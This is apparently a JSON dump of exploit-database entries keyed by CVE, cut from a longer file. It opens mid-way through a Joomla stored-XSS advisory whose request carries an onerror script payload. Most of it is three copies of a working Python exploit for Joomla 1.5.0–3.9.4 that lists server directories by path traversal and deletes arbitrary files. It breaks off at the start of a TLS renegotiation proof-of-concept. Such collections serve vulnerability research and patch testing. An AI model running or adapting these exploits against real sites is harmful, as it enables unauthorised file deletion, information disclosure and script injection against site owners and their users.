\njform%5Bsitename%5D=testjoomla&jform%5Boffline%5D=0&jform%5Bdisplay_offline_message%5D=1&jform%5Boffline_message%5D=This+site+is+down+for+maintenance.%3Cbr+%2F%3EPlease+check+back+again+soon.&jform%5Boffline_image%5D=&jform%5Bfrontediting%5D=1&jform%5Beditor%5D=tinymce&jform%5Bcaptcha%5D=0&jform%5Baccess%5D=1&jform%5Blist_limit%5D=20&jform%5Bfeed_limit%5D=10&jform%5Bfeed_email%5D=none&jform%5BMetaDesc%5D=adsadsa&jform%5BMetaKeys%5D=&jform%5Brobots%5D=&jform%5BMetaRights%5D=&jform%5BMetaAuthor%5D=1&jform%5BMetaVersion%5D=0&jform%5Bsef%5D=1&jform%5Bsef_rewrite%5D=0&jform%5Bsef_suffix%5D=0&jform%5Bunicodeslugs%5D=0&jform%5Bsitename_pagetitles%5D=0&jform%5Bcookie_domain%5D=&jform%5Bcookie_path%5D=&jform%5Blog_path%5D=%2Fvar%2Fwww%2Fhtml%2Fadministrator%2Flogs&jform%5Bhelpurl%5D=https%3A%2F%2Fhelp.joomla.org%2Fproxy%3Fkeyref%3DHelp%7Bmajor%7D%7Bminor%7D%3A%7Bkeyref%7D%26lang%3D%7Blangcode%7D&jform%5Bdebug%5D=0&jform%5Bdebug_lang%5D=0&jform%5Bdebug_lang_const%5D=1&jform%5Bcache_handler%5D=file&jform%5Bcache_path%5D=&jform%5Bmemcache_persist%5D=1&jform%5Bmemcache_compress%5D=0&jform%5Bmemcache_server_host%5D=localhost&jform%5Bmemcache_server_port%5D=11211&jform%5Bmemcached_persist%5D=1&jform%5Bmemcached_compress%5D=0&jform%5Bmemcached_server_host%5D=localhost&jform%5Bmemcached_server_port%5D=11211&jform%5Bredis_persist%5D=1&jform%5Bredis_server_host%5D=localhost&jform%5Bredis_server_port%5D=6379&jform%5Bredis_server_auth%5D=&jform%5Bredis_server_db%5D=0&jform%5Bcachetime%5D=15&jform%5Bcache_platformprefix%5D=0&jform%5Bcaching%5D=0&jform%5Bsession_handler%5D=database&jform%5Bsession_memcache_server_host%5D=localhost&jform%5Bsession_memcache_server_port%5D=11211&jform%5Bsession_memcached_server_host%5D=localhost&jform%5Bsession_memcached_server_port%5D=11211&jform%5Bsession_redis_persist%5D=1&jform%5Bsession_redis_server_host%5D=localhost&jform%5Bsession_redis_server_port%5D=6379&jform%5Bsession_redis_server_auth%5D=&jform%5Bsession_redis_server_db%5D=0&jform%5Blifetime%5D=15&jform%5Bshared_session%5D=0&jform%5Btmp_path%5D=%2Fvar%2Fwww%2Fhtml%2Ftmp&jform%5Bgzip%5D=0&jform%5Berror_reporting%5D=default&jform%5Bforce_ssl%5D=0&jform%5Boffset%5D=UTC&jform%5Bftp_enable%5D=0&jform%5Bftp_host%5D=&jform%5Bftp_port%5D=&jform%5Bftp_user%5D=&jform%5Bftp_pass%5D=&jform%5Bftp_root%5D=&jform%5Bproxy_enable%5D=0&jform%5Bproxy_host%5D=&jform%5Bproxy_port%5D=&jform%5Bproxy_user%5D=&jform%5Bproxy_pass%5D=&jform%5Bdbtype%5D=mysqli&jform%5Bhost%5D=localhost&jform%5Buser%5D=root&jform%5Bdb%5D=joomla&jform%5Bdbprefix%5D=isadh_&jform%5Bmailonline%5D=1&jform%5Bmassmailoff%5D=0&jform%5Bmailfrom%5D=test%40example.com&jform%5Bfromname%5D=testjoomla&jform%5Breplyto%5D=&jform%5Breplytoname%5D=&jform%5Bmailer%5D=mail&jform%5Bsendmail%5D=%2Fusr%2Fsbin%2Fsendmail&jform%5Bsmtphost%5D=localhost&jform%5Bsmtpport%5D=25&jform%5Bsmtpsecure%5D=none&jform%5Bsmtpauth%5D=0&jform%5Bsmtpuser%5D=&jform%5Bsmtppass%5D=&jform%5Bfilters%5D%5B1%5D%5Bfilter_type%5D=BL&jform%5Bfilters%5D%5B1%5D%5Bfilter_tags%5D=ss%22%3E%3Cimg+src%3D+xx+onerror%3Dalert%287575%29%3E%3C&jform%5Bfilters%5D%5B1%5D%5Bfilter_attributes%5D=&jform%5Bfilters%5D%5B9%5D%5Bfilter_type%5D=BL&jform%5Bfilters%5D%5B9%5D%5Bfilter_tags%5D=&jform%5Bfilters%5D%5B9%5D%5Bfilter_attributes%5D=&jform%5Bfilters%5D%5B6%5D%5Bfilter_type%5D=BL&jform%5Bfilters%5D%5B6%5D%5Bfilter_tags%5D=&jform%5Bfilters%5D%5B6%5D%5Bfilter_attributes%5D=&jform%5Bfilters%5D%5B7%5D%5Bfilter_type%5D=BL&jform%5Bfilters%5D%5B7%5D%5Bfilter_tags%5D=&jform%5Bfilters%5D%5B7%5D%5Bfilter_attributes%5D=&jform%5Bfilters%5D%5B2%5D%5Bfilter_type%5D=NH&jform%5Bfilters%5D%5B2%5D%5Bfilter_tags%5D=&jform%5Bfilters%5D%5B2%5D%5Bfilter_attributes%5D=&jform%5Bfilters%5D%5B3%5D%5Bfilter_type%5D=BL&jform%5Bfilters%5D%5B3%5D%5Bfilter_tags%5D=&jform%5Bfilters%5D%5B3%5D%5Bfilter_attributes%5D=&jform%5Bfilters%5D%5B4%5D%5Bfilter_type%5D=BL&jform%5Bfilters%5D%5B4%5D%5Bfilter_tags%5D=&jform%5Bfilters%5D%5B4%5D%5Bfilter_attributes%5D=&jform%5Bfilters%5D%5B5%5D%5Bfilter_type%5D=BL&jform%5Bfilters%5D%5B5%5D%5Bfilter_tags%5D=&jform%5Bfilters%5D%5B5%5D%5Bfilter_attributes%5D=&jf  \n  \n  \n  \n4. Save the Changes.  \n5. Navigate to Global Configuration page and an alert box will pop up. Here's the response body:  \n  \n==========  \nResponse:  \n==========  \nHTTP/1.1 303 See other  \nDate: Fri, 18 Jan 2019 07:30:48 GMT  \nServer: Apache/2.4.7 (Ubuntu)  \nX-Powered-By: PHP/5.5.9-1ubuntu4.26  \nLocation: /administrator/index.php?option=com_config  \nExpires: Wed, 17 Aug 2005 00:00:00 GMT  \nLast-Modified: Fri, 18 Jan 2019 07:30:48 GMT  \nCache-Control: no-store, no-cache, must-revalidate, post-check=0, pre-check=0  \nPragma: no-cache  \nContent-Length: 0  \nConnection: close  \nContent-Type: text/html; charset=utf-8  \n  \n  \n===================================  \n#Vulnerability Disclosure Timeline:  \n===================================  \n  \n11/2018: First email to disclose the vulnerability to Joomla.  \n12/2018: Vendor confirmed vulnerability.  \n01/2019: Vendor published advisory and released a fix.  \n`\n",
            "cvss": {
                "score": 3.5,
                "vector": "AV:NETWORK/AC:MEDIUM/Au:SINGLE_INSTANCE/C:NONE/I:PARTIAL/A:NONE/"
            },
            "vhref": "https://vulners.com/packetstorm/PACKETSTORM:151234"
        }
    ],
    "CVE-2019-10945": [
        {
            "bulletinFamily": "exploit",
            "description": "",
            "modified": "2019-04-16T00:00:00",
            "published": "2019-04-16T00:00:00",
            "id": "EDB-ID:46710",
            "href": "https://www.exploit-db.com/exploits/46710",
            "type": "exploitdb",
            "title": "Joomla Core 1.5.0 - 3.9.4 - Directory Traversal / Authenticated Arbitrary File Deletion",
            "sourceData": "# Exploit Title: Joomla Core (1.5.0 through 3.9.4) - Directory Traversal && Authenticated Arbitrary File Deletion\r\n# Date: 2019-March-13\r\n# Exploit Author: Haboob Team\r\n# Web Site: haboob.sa\r\n# Email: research@haboob.sa\r\n# Software Link: https://www.joomla.org/\r\n# Versions: Joomla 1.5.0 through Joomla 3.9.4\r\n# CVE : CVE-2019-10945\r\n# https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2019-10945\r\n#\r\n# Usage:\r\n#  List files in the specified directory:\r\n#  python exploit.py --url=http://example.com/administrator --username=<joomla-manager-username> --password=<joomla-manager-password> --dir=<directory name>\r\n#\r\n#  Delete file in specified directory\r\n#  python exploit.py --url=http://example.com/administrator --username=<joomla-manager-username> --password=<joomla-manager-password> --dir=<directory to list>  --rm=<file name>\r\n\r\n\r\nimport re\r\nimport tempfile\r\nimport pickle\r\nimport os\r\nimport hashlib\r\nimport urllib\r\n\r\ntry:\r\n    import click\r\nexcept ImportError:\r\n    print(\"module 'click' doesn't exist, type: pip install click\")\r\n    exit(0)\r\n\r\ntry:\r\n    import requests\r\nexcept ImportError:\r\n    print(\"module 'requests' doesn't exist, type: pip install requests\")\r\n    exit(0)\r\ntry:\r\n    import lxml.html\r\nexcept ImportError:\r\n    print(\"module 'lxml' doesn't exist, type: pip install lxml\")\r\n    exit(0)\r\n\r\nmediaList = \"?option=com_media&view=mediaList&tmpl=component&folder=/..\"\r\n\r\nprint ''' \r\n# Exploit Title: Joomla Core (1.5.0 through 3.9.4) - Directory Traversal && Authenticated Arbitrary File Deletion\r\n# Web Site: Haboob.sa\r\n# Email: research@haboob.sa\r\n# Versions: Joomla 1.5.0 through Joomla 3.9.4\r\n# https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2019-10945    \r\n _    _          ____   ____   ____  ____  \r\n| |  | |   /\\   |  _ \\ / __ \\ / __ \\|  _ \\ \r\n| |__| |  /  \\  | |_) | |  | | |  | | |_) |\r\n|  __  | / /\\ \\ |  _ <| |  | | |  | |  _ < \r\n| |  | |/ ____ \\| |_) | |__| | |__| | |_) |\r\n|_|  |_/_/    \\_\\____/ \\____/ \\____/|____/ \r\n                                                                       \r\n'''\r\nclass URL(click.ParamType):\r\n    name = 'url'\r\n    regex = re.compile(\r\n        r'^(?:http)s?://'  # http:// or https://\r\n        r'(?:(?:[A-Z0-9](?:[A-Z0-9-]{0,61}[A-Z0-9])?\\.)+(?:[A-Z]{2,6}\\.?|[A-Z0-9-]{2,}\\.?)|'  # domain...\r\n        r'localhost|'  # localhost...\r\n        r'\\d{1,3}\\.\\d{1,3}\\.\\d{1,3}\\.\\d{1,3})'  # ...or ip\r\n        r'(?::\\d+)?'  # optional port\r\n        r'(?:/?|[/?]\\S+)$', re.IGNORECASE)\r\n\r\n    def convert(self, value, param, ctx):\r\n        if not isinstance(value, tuple):\r\n            if re.match(self.regex, value) is None:\r\n                self.fail('invalid URL (%s)' % value, param, ctx)\r\n        return value\r\n\r\n\r\ndef getForm(url, query, cookie=''):\r\n    r = requests.get(url, cookies=cookie, timeout=5)\r\n    if r.status_code != 200:\r\n        print(\"invalid URL: 404 NOT FOUND!!\")\r\n        exit(0)\r\n    page = r.text.encode('utf-8')\r\n    html = lxml.html.fromstring(page)\r\n    return html.xpath(query), r.cookies\r\n\r\n\r\ndef login(url, username, password):\r\n    csrf, cookie = getForm(url, '//input/@name')\r\n    postData = {'username': username, 'passwd': password, 'option': 'com_login', 'task': 'login',\r\n                'return': 'aW5kZXgucGhw', csrf[-1]: 1}\r\n\r\n    res = requests.post(url, cookies=cookie.get_dict(), data=postData, allow_redirects=False)\r\n    if res.status_code == 200:\r\n        html = lxml.html.fromstring(res.text)\r\n        msg = html.xpath(\"//div[@class='alert-message']/text()[1]\")\r\n        print msg\r\n        exit()\r\n    else:\r\n        get_cookies(res.cookies.get_dict(), url, username, password)\r\n\r\n\r\ndef save_cookies(requests_cookiejar, filename):\r\n    with open(filename, 'wb') as f:\r\n        pickle.dump(requests_cookiejar, f)\r\n\r\n\r\ndef load_cookies(filename):\r\n    with open(filename, 'rb') as f:\r\n        return pickle.load(f)\r\n\r\n\r\ndef cookies_file_name(url, username, password):\r\n    result = hashlib.md5(str(url) + str(username) + str(password))\r\n    _dir = tempfile.gettempdir()\r\n    return _dir + \"/\" + result.hexdigest() + \".Jcookie\"\r\n\r\n\r\ndef get_cookies(req_cookie, url, username, password):\r\n    cookie_file = cookies_file_name(url, username, password)\r\n    if os.path.isfile(cookie_file):\r\n        return load_cookies(cookie_file)\r\n    else:\r\n        save_cookies(req_cookie, cookie_file)\r\n        return req_cookie\r\n\r\n\r\ndef traversal(url, username, password, dir=None):\r\n    cookie = get_cookies('', url, username, password)\r\n    url = url + mediaList + dir\r\n    files, cookie = getForm(url, \"//input[@name='rm[]']/@value\", cookie)\r\n    for file in files:\r\n        print file\r\n    pass\r\n\r\n\r\ndef removeFile(baseurl, username, password, dir='', file=''):\r\n    cookie = get_cookies('', baseurl, username, password)\r\n    url = baseurl + mediaList + dir\r\n    link, _cookie = getForm(url, \"//a[@target='_top']/@href\", cookie)\r\n    if link:\r\n        link = urllib.unquote(link[0].encode(\"utf8\"))\r\n        link = link.split('folder=')[0]\r\n        link = link.replace(\"folder.delete\", \"file.delete\")\r\n        link = baseurl + link + \"folder=/..\" + dir + \"&rm[]=\" + file\r\n        msg, cookie = getForm(link, \"//div[@class='alert-message']/text()[1]\", cookie)\r\n        if len(msg) == 0:\r\n            print \"ERROR : File does not exist\"\r\n        else:\r\n            print msg\r\n    else:\r\n        print \"ERROR:404 NOT FOUND!!\"\r\n\r\n\r\n@click.group(invoke_without_command=True)\r\n@click.option('--url', type=URL(), help=\"Joomla Administrator URL\", required=True)\r\n@click.option('--username', type=str, help=\"Joomla Manager username\", required=True)\r\n@click.option('--password', type=str, help=\"Joomla Manager password\", required=True)\r\n@click.option('--dir', type=str, help=\"listing directory\")\r\n@click.option('--rm', type=str, help=\"delete file\")\r\n@click.pass_context\r\ndef cli(ctx, url, username, password, dir, rm):\r\n    url = url+\"/\"\r\n    cookie_file = cookies_file_name(url, username, password)\r\n    if not os.path.isfile(cookie_file):\r\n        login(url, username, password)\r\n    if dir is not None:\r\n        dir = dir.lstrip('/')\r\n        dir = dir.rstrip('/')\r\n        dir = \"/\" + dir\r\n        if dir == \"/\" or dir == \"../\" or dir == \"/.\":\r\n            dir = ''\r\n    else:\r\n        dir = ''\r\n    print dir\r\n    if rm is not None:\r\n        removeFile(url, username, password, dir, rm)\r\n    else:\r\n        traversal(url, username, password, dir)\r\n\r\n\r\ncli()",
            "cvss": {
                "score": 7.5,
                "vector": "AV:NETWORK/AC:LOW/Au:NONE/C:PARTIAL/I:PARTIAL/A:PARTIAL/"
            },
            "vhref": "https://vulners.com/exploitdb/EDB-ID:46710"
        },
        {
            "bulletinFamily": "exploit",
            "description": "Exploit for php platform in category web applications",
            "modified": "2019-04-16T00:00:00",
            "published": "2019-04-16T00:00:00",
            "id": "1337DAY-ID-32548",
            "href": "https://0day.today/exploit/description/32548",
            "title": "Joomla Core 1.5.0 - 3.9.4 - Directory Traversal / Authenticated Arbitrary File Deletion Exploit",
            "type": "zdt",
            "sourceData": "# Exploit Title: Joomla Core (1.5.0 through 3.9.4) - Directory Traversal && Authenticated Arbitrary File Deletion\r\n# Exploit Author: Haboob Team\r\n# Web Site: haboob.sa\r\n# Email: [email\u00a0protected]\r\n# Software Link: https://www.joomla.org/\r\n# Versions: Joomla 1.5.0 through Joomla 3.9.4\r\n# CVE : CVE-2019-10945\r\n# https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2019-10945\r\n#\r\n# Usage:\r\n#  List files in the specified directory:\r\n#  python exploit.py --url=http://example.com/administrator --username=<joomla-manager-username> --password=<joomla-manager-password> --dir=<directory name>\r\n#\r\n#  Delete file in specified directory\r\n#  python exploit.py --url=http://example.com/administrator --username=<joomla-manager-username> --password=<joomla-manager-password> --dir=<directory to list>  --rm=<file name>\r\n\r\n\r\nimport re\r\nimport tempfile\r\nimport pickle\r\nimport os\r\nimport hashlib\r\nimport urllib\r\n\r\ntry:\r\n    import click\r\nexcept ImportError:\r\n    print(\"module 'click' doesn't exist, type: pip install click\")\r\n    exit(0)\r\n\r\ntry:\r\n    import requests\r\nexcept ImportError:\r\n    print(\"module 'requests' doesn't exist, type: pip install requests\")\r\n    exit(0)\r\ntry:\r\n    import lxml.html\r\nexcept ImportError:\r\n    print(\"module 'lxml' doesn't exist, type: pip install lxml\")\r\n    exit(0)\r\n\r\nmediaList = \"?option=com_media&view=mediaList&tmpl=component&folder=/..\"\r\n\r\nprint ''' \r\n# Exploit Title: Joomla Core (1.5.0 through 3.9.4) - Directory Traversal && Authenticated Arbitrary File Deletion\r\n# Web Site: Haboob.sa\r\n# Email: [email\u00a0protected]\r\n# Versions: Joomla 1.5.0 through Joomla 3.9.4\r\n# https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2019-10945    \r\n _    _          ____   ____   ____  ____  \r\n| |  | |   /\\   |  _ \\ / __ \\ / __ \\|  _ \\ \r\n| |__| |  /  \\  | |_) | |  | | |  | | |_) |\r\n|  __  | / /\\ \\ |  _ <| |  | | |  | |  _ < \r\n| |  | |/ ____ \\| |_) | |__| | |__| | |_) |\r\n|_|  |_/_/    \\_\\____/ \\____/ \\____/|____/ \r\n                                                                       \r\n'''\r\nclass URL(click.ParamType):\r\n    name = 'url'\r\n    regex = re.compile(\r\n        r'^(?:http)s?://'  # http:// or https://\r\n        r'(?:(?:[A-Z0-9](?:[A-Z0-9-]{0,61}[A-Z0-9])?\\.)+(?:[A-Z]{2,6}\\.?|[A-Z0-9-]{2,}\\.?)|'  # domain...\r\n        r'localhost|'  # localhost...\r\n        r'\\d{1,3}\\.\\d{1,3}\\.\\d{1,3}\\.\\d{1,3})'  # ...or ip\r\n        r'(?::\\d+)?'  # optional port\r\n        r'(?:/?|[/?]\\S+)$', re.IGNORECASE)\r\n\r\n    def convert(self, value, param, ctx):\r\n        if not isinstance(value, tuple):\r\n            if re.match(self.regex, value) is None:\r\n                self.fail('invalid URL (%s)' % value, param, ctx)\r\n        return value\r\n\r\n\r\ndef getForm(url, query, cookie=''):\r\n    r = requests.get(url, cookies=cookie, timeout=5)\r\n    if r.status_code != 200:\r\n        print(\"invalid URL: 404 NOT FOUND!!\")\r\n        exit(0)\r\n    page = r.text.encode('utf-8')\r\n    html = lxml.html.fromstring(page)\r\n    return html.xpath(query), r.cookies\r\n\r\n\r\ndef login(url, username, password):\r\n    csrf, cookie = getForm(url, '//input/@name')\r\n    postData = {'username': username, 'passwd': password, 'option': 'com_login', 'task': 'login',\r\n                'return': 'aW5kZXgucGhw', csrf[-1]: 1}\r\n\r\n    res = requests.post(url, cookies=cookie.get_dict(), data=postData, allow_redirects=False)\r\n    if res.status_code == 200:\r\n        html = lxml.html.fromstring(res.text)\r\n        msg = html.xpath(\"//div[@class='alert-message']/text()[1]\")\r\n        print msg\r\n        exit()\r\n    else:\r\n        get_cookies(res.cookies.get_dict(), url, username, password)\r\n\r\n\r\ndef save_cookies(requests_cookiejar, filename):\r\n    with open(filename, 'wb') as f:\r\n        pickle.dump(requests_cookiejar, f)\r\n\r\n\r\ndef load_cookies(filename):\r\n    with open(filename, 'rb') as f:\r\n        return pickle.load(f)\r\n\r\n\r\ndef cookies_file_name(url, username, password):\r\n    result = hashlib.md5(str(url) + str(username) + str(password))\r\n    _dir = tempfile.gettempdir()\r\n    return _dir + \"/\" + result.hexdigest() + \".Jcookie\"\r\n\r\n\r\ndef get_cookies(req_cookie, url, username, password):\r\n    cookie_file = cookies_file_name(url, username, password)\r\n    if os.path.isfile(cookie_file):\r\n        return load_cookies(cookie_file)\r\n    else:\r\n        save_cookies(req_cookie, cookie_file)\r\n        return req_cookie\r\n\r\n\r\ndef traversal(url, username, password, dir=None):\r\n    cookie = get_cookies('', url, username, password)\r\n    url = url + mediaList + dir\r\n    files, cookie = getForm(url, \"//input[@name='rm[]']/@value\", cookie)\r\n    for file in files:\r\n        print file\r\n    pass\r\n\r\n\r\ndef removeFile(baseurl, username, password, dir='', file=''):\r\n    cookie = get_cookies('', baseurl, username, password)\r\n    url = baseurl + mediaList + dir\r\n    link, _cookie = getForm(url, \"//a[@target='_top']/@href\", cookie)\r\n    if link:\r\n        link = urllib.unquote(link[0].encode(\"utf8\"))\r\n        link = link.split('folder=')[0]\r\n        link = link.replace(\"folder.delete\", \"file.delete\")\r\n        link = baseurl + link + \"folder=/..\" + dir + \"&rm[]=\" + file\r\n        msg, cookie = getForm(link, \"//div[@class='alert-message']/text()[1]\", cookie)\r\n        if len(msg) == 0:\r\n            print \"ERROR : File does not exist\"\r\n        else:\r\n            print msg\r\n    else:\r\n        print \"ERROR:404 NOT FOUND!!\"\r\n\r\n\r\n@click.group(invoke_without_command=True)\r\n@click.option('--url', type=URL(), help=\"Joomla Administrator URL\", required=True)\r\n@click.option('--username', type=str, help=\"Joomla Manager username\", required=True)\r\n@click.option('--password', type=str, help=\"Joomla Manager password\", required=True)\r\n@click.option('--dir', type=str, help=\"listing directory\")\r\n@click.option('--rm', type=str, help=\"delete file\")\r\n@click.pass_context\r\ndef cli(ctx, url, username, password, dir, rm):\r\n    url = url+\"/\"\r\n    cookie_file = cookies_file_name(url, username, password)\r\n    if not os.path.isfile(cookie_file):\r\n        login(url, username, password)\r\n    if dir is not None:\r\n        dir = dir.lstrip('/')\r\n        dir = dir.rstrip('/')\r\n        dir = \"/\" + dir\r\n        if dir == \"/\" or dir == \"../\" or dir == \"/.\":\r\n            dir = ''\r\n    else:\r\n        dir = ''\r\n    print dir\r\n    if rm is not None:\r\n        removeFile(url, username, password, dir, rm)\r\n    else:\r\n        traversal(url, username, password, dir)\r\n\r\n\r\ncli()\n\n#  0day.today [2019-04-17]  #",
            "cvss": {
                "score": 7.5,
                "vector": "AV:NETWORK/AC:LOW/Au:NONE/C:PARTIAL/I:PARTIAL/A:PARTIAL/"
            },
            "vhref": "https://vulners.com/zdt/1337DAY-ID-32548"
        },
        {
            "bulletinFamily": "exploit",
            "description": "",
            "modified": "2019-04-16T00:00:00",
            "published": "2019-04-16T00:00:00",
            "id": "PACKETSTORM:152515",
            "href": "https://packetstormsecurity.com/files/152515/Joomla-3.9.4-Arbitrary-File-Deletion-Directory-Traversal.html",
            "title": "Joomla 3.9.4 Arbitrary File Deletion / Directory Traversal",
            "type": "packetstorm",
            "sourceData": "`# Exploit Title: Joomla Core (1.5.0 through 3.9.4) - Directory Traversal && Authenticated Arbitrary File Deletion  \n# Date: 2019-March-13  \n# Exploit Author: Haboob Team  \n# Web Site: haboob.sa  \n# Email: research@haboob.sa  \n# Software Link: https://www.joomla.org/  \n# Versions: Joomla 1.5.0 through Joomla 3.9.4  \n# CVE : CVE-2019-10945  \n# https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2019-10945  \n#  \n# Usage:  \n# List files in the specified directory:  \n# python exploit.py --url=http://example.com/administrator --username=<joomla-manager-username> --password=<joomla-manager-password> --dir=<directory name>  \n#  \n# Delete file in specified directory  \n# python exploit.py --url=http://example.com/administrator --username=<joomla-manager-username> --password=<joomla-manager-password> --dir=<directory to list> --rm=<file name>  \n  \n  \nimport re  \nimport tempfile  \nimport pickle  \nimport os  \nimport hashlib  \nimport urllib  \n  \ntry:  \nimport click  \nexcept ImportError:  \nprint(\"module 'click' doesn't exist, type: pip install click\")  \nexit(0)  \n  \ntry:  \nimport requests  \nexcept ImportError:  \nprint(\"module 'requests' doesn't exist, type: pip install requests\")  \nexit(0)  \ntry:  \nimport lxml.html  \nexcept ImportError:  \nprint(\"module 'lxml' doesn't exist, type: pip install lxml\")  \nexit(0)  \n  \nmediaList = \"?option=com_media&view=mediaList&tmpl=component&folder=/..\"  \n  \nprint '''   \n# Exploit Title: Joomla Core (1.5.0 through 3.9.4) - Directory Traversal && Authenticated Arbitrary File Deletion  \n# Web Site: Haboob.sa  \n# Email: research@haboob.sa  \n# Versions: Joomla 1.5.0 through Joomla 3.9.4  \n# https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2019-10945   \n_ _ ____ ____ ____ ____   \n| | | | /\\ | _ \\ / __ \\ / __ \\| _ \\   \n| |__| | / \\ | |_) | | | | | | | |_) |  \n| __ | / /\\ \\ | _ <| | | | | | | _ <   \n| | | |/ ____ \\| |_) | |__| | |__| | |_) |  \n|_| |_/_/ \\_\\____/ \\____/ \\____/|____/   \n  \n'''  \nclass URL(click.ParamType):  \nname = 'url'  \nregex = re.compile(  \nr'^(?:http)s?://' # http:// or https://  \nr'(?:(?:[A-Z0-9](?:[A-Z0-9-]{0,61}[A-Z0-9])?\\.)+(?:[A-Z]{2,6}\\.?|[A-Z0-9-]{2,}\\.?)|' # domain...  \nr'localhost|' # localhost...  \nr'\\d{1,3}\\.\\d{1,3}\\.\\d{1,3}\\.\\d{1,3})' # ...or ip  \nr'(?::\\d+)?' # optional port  \nr'(?:/?|[/?]\\S+)$', re.IGNORECASE)  \n  \ndef convert(self, value, param, ctx):  \nif not isinstance(value, tuple):  \nif re.match(self.regex, value) is None:  \nself.fail('invalid URL (%s)' % value, param, ctx)  \nreturn value  \n  \n  \ndef getForm(url, query, cookie=''):  \nr = requests.get(url, cookies=cookie, timeout=5)  \nif r.status_code != 200:  \nprint(\"invalid URL: 404 NOT FOUND!!\")  \nexit(0)  \npage = r.text.encode('utf-8')  \nhtml = lxml.html.fromstring(page)  \nreturn html.xpath(query), r.cookies  \n  \n  \ndef login(url, username, password):  \ncsrf, cookie = getForm(url, '//input/@name')  \npostData = {'username': username, 'passwd': password, 'option': 'com_login', 'task': 'login',  \n'return': 'aW5kZXgucGhw', csrf[-1]: 1}  \n  \nres = requests.post(url, cookies=cookie.get_dict(), data=postData, allow_redirects=False)  \nif res.status_code == 200:  \nhtml = lxml.html.fromstring(res.text)  \nmsg = html.xpath(\"//div[@class='alert-message']/text()[1]\")  \nprint msg  \nexit()  \nelse:  \nget_cookies(res.cookies.get_dict(), url, username, password)  \n  \n  \ndef save_cookies(requests_cookiejar, filename):  \nwith open(filename, 'wb') as f:  \npickle.dump(requests_cookiejar, f)  \n  \n  \ndef load_cookies(filename):  \nwith open(filename, 'rb') as f:  \nreturn pickle.load(f)  \n  \n  \ndef cookies_file_name(url, username, password):  \nresult = hashlib.md5(str(url) + str(username) + str(password))  \n_dir = tempfile.gettempdir()  \nreturn _dir + \"/\" + result.hexdigest() + \".Jcookie\"  \n  \n  \ndef get_cookies(req_cookie, url, username, password):  \ncookie_file = cookies_file_name(url, username, password)  \nif os.path.isfile(cookie_file):  \nreturn load_cookies(cookie_file)  \nelse:  \nsave_cookies(req_cookie, cookie_file)  \nreturn req_cookie  \n  \n  \ndef traversal(url, username, password, dir=None):  \ncookie = get_cookies('', url, username, password)  \nurl = url + mediaList + dir  \nfiles, cookie = getForm(url, \"//input[@name='rm[]']/@value\", cookie)  \nfor file in files:  \nprint file  \npass  \n  \n  \ndef removeFile(baseurl, username, password, dir='', file=''):  \ncookie = get_cookies('', baseurl, username, password)  \nurl = baseurl + mediaList + dir  \nlink, _cookie = getForm(url, \"//a[@target='_top']/@href\", cookie)  \nif link:  \nlink = urllib.unquote(link[0].encode(\"utf8\"))  \nlink = link.split('folder=')[0]  \nlink = link.replace(\"folder.delete\", \"file.delete\")  \nlink = baseurl + link + \"folder=/..\" + dir + \"&rm[]=\" + file  \nmsg, cookie = getForm(link, \"//div[@class='alert-message']/text()[1]\", cookie)  \nif len(msg) == 0:  \nprint \"ERROR : File does not exist\"  \nelse:  \nprint msg  \nelse:  \nprint \"ERROR:404 NOT FOUND!!\"  \n  \n  \n@click.group(invoke_without_command=True)  \n@click.option('--url', type=URL(), help=\"Joomla Administrator URL\", required=True)  \n@click.option('--username', type=str, help=\"Joomla Manager username\", required=True)  \n@click.option('--password', type=str, help=\"Joomla Manager password\", required=True)  \n@click.option('--dir', type=str, help=\"listing directory\")  \n@click.option('--rm', type=str, help=\"delete file\")  \n@click.pass_context  \ndef cli(ctx, url, username, password, dir, rm):  \nurl = url+\"/\"  \ncookie_file = cookies_file_name(url, username, password)  \nif not os.path.isfile(cookie_file):  \nlogin(url, username, password)  \nif dir is not None:  \ndir = dir.lstrip('/')  \ndir = dir.rstrip('/')  \ndir = \"/\" + dir  \nif dir == \"/\" or dir == \"../\" or dir == \"/.\":  \ndir = ''  \nelse:  \ndir = ''  \nprint dir  \nif rm is not None:  \nremoveFile(url, username, password, dir, rm)  \nelse:  \ntraversal(url, username, password, dir)  \n  \n  \ncli()  \n`\n",
            "cvss": {
                "score": 7.5,
                "vector": "AV:NETWORK/AC:LOW/Au:NONE/C:PARTIAL/I:PARTIAL/A:PARTIAL/"
            },
            "vhref": "https://vulners.com/packetstorm/PACKETSTORM:152515"
        }
    ],
    "CVE-2009-3555": [
        {
            "bulletinFamily": "exploit",
            "description": "No description provided by source.",
            "modified": "2014-07-01T00:00:00",
            "published": "2014-07-01T00:00:00",
            "href": "https://www.seebug.org/vuldb/ssvid-67231",
            "id": "SSV:67231",
            "title": "TLS Renegotiation Vulnerability PoC",
            "type": "seebug",
            "sourceData": "\n                                                #!/usr/bin/env python\r\n\r\n######################################\r\n#                                    #\r\n#  RedTeam Pentesting GmbH           #\r\n#  kontakt@redteam-pentesting.de     #\r\n#  http://www.redteam-pentesting.de  #\r\n#                                    #\r\n######################################\r\n\r\n# PoC exploit for the TLS renegotiation vulnerability (CVE-2009-3555)\r\n\r\n# License\r\n# -------\r\n# CC-BY-SA http://creativecommons.org/licenses/by-sa/3.0/\r\n\r\n# Timeline\r\n# --------\r\n# 2009-12-21 initial public release\r\n\r\n# Known Issues\r\n# ------------\r\n# Firefox: if it fails connecting to a TLS site too often, falls back to\r\n#          issuing SSLv2 ClientHello only until browser is restarted\r\n#\r\n# wget:    attempts SSLv2 ClientHello by default\r\n\r\n# References\r\n# ----------\r\n# http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2009-3555\r\n# http://www.phonefactor.com/sslgap\r\n# http://www.extendedsubset.com/\r\n# http://www.g-sec.lu/practicaltls.pdf\r\n# http://tools.ietf.org/html/draft-ietf-tls-renegotiation-01\r\n\r\nimport tlslite\r\nimport tlslite.api\r\nimport tlslite.messages\r\nimport tlslite.constants\r\nimport struct\r\nimport socket\r\nimport threading\r\nimport array\r\nimport sys\r\nimport optparse\r\n\r\n\r\nif not hasattr(threading.Thread, &#39;name&#39;):\r\n    # emulate python 2.6 threading module for earlier versions\r\n    threading.current_thread = threading.currentThread\r\n    setattr(threading.Thread, &#39;name&#39;,\r\n            property(threading.Thread.getName, 